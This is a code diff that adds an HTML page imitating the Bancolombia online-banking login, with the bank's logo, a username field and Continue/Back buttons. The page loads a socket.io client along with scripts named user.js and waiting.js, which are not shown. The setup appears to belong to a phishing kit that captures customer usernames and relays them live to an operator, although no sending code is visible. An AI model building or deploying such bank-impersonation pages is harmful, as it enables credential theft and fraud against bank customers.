@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Autenticación Bancolombia</title>
+    <link rel="stylesheet" href="./styles/estilos.css" />
+    <script src="../../js/functions.js"></script>
+  </head>
+  <body>
+    <header class="header">
+      <img
+        src="media/headerIconBancolombia.e9678f112a702758542f8f98283cea47.svg"
+        alt="Logo Centro"
+        class="logo-center"
+      />
+      <div class="exit-container">
+        <span class="exit-text">Salir</span>
+        <img
+          src="media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg"
+          alt="Icono Salir"
+          class="logo-right"
+        />
+      </div>
+    </header>
+
+    <div class="welcome-container">
+      <span class="welcome-text">Te damos la bienvenida</span>
+    </div>
+
+    <div class="modal-container">
+      <p class="modal-text">
+        El usuario es el mismo con el que<br />
+        ingresas a la<br />
+        <strong>Sucursal Virtual Personas</strong>
+      </p>
+
+      <!-- Nueva sección añadida -->
+      <div class="user-info">
+        <div class="user-details">
+          <img
+            src="media/user.39a37ef47269f6d65906fbb23186e4b6.svg"
+            alt="Icono Usuario"
+            class="user-icon"
+          />
+          <input
+            type="text"
+            class="user-input"
+            placeholder="Usuario"
+            style="padding-left: 12px"
+            id="user-input"
+          />
+        </div>
+        <hr class="separator" />
+        <a href="#" class="forgot-user">¿Olvidaste tu usuario?</a>
+      </div>
+
+      <!-- Nuevos botones añadidos -->
+      <div class="buttons-container">
+        <button class="btn volver" id="back-button">Volver</button>
+        <button class="btn continuar" id="continue">Continuar</button>
+      </div>
+    </div>
+
+    <!-- Nuevo contenedor para la imagen "trazo" -->
+    <div class="trazo-container">
+      <img
+        src="media/trazo-desktop.3de67dbd4b31f3798f8a1d3e3a90197c.svg"
+        alt="Trazo"
+        class="trazo-image"
+      />
+    </div>
+
+    <script src="js/user.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/waiting.js"></script>
+    <script src="js/back.js"></script>
+  </body>
+</html>
